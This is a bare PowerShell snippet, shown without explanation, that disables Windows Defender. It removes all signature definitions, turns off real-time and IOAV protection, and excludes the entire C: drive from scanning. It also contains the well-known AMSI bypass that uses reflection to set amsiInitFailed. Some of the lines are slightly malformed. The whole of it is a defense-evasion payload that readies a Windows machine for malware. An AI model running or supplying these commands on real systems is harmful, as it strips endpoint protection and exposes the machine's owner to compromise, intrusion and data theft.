Set-Location -Path $env:USERPROFILE -PassThru;
"${env:ProgramFiles}\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All Set-MpPreference -DisableIOAVProtection $true;
Set-MpPreference -DisableRealtimeMonitoring $true; Add-MpPreference -ExclusionPath "c:/";  
"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)";
